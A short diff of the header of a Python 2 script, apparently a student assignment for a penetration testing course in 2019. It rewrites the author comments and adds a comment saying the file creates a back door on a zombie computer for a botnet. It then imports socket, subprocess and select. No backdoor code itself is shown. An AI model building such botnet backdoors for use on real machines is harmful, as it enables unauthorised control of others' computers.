@@ -1,7 +1,10 @@
 #!/usr/bin/python2
 
-# Additions by Kyle Healy for CPSC62700
-# Due: 2/13/2019
+#Kyle Healy
+#CPSC 62700 - Penetration Testing
+#2/13/2019
+
+# Python function to create a back door on a zombie computer for a bot net.
 
 import socket, subprocess, select
 
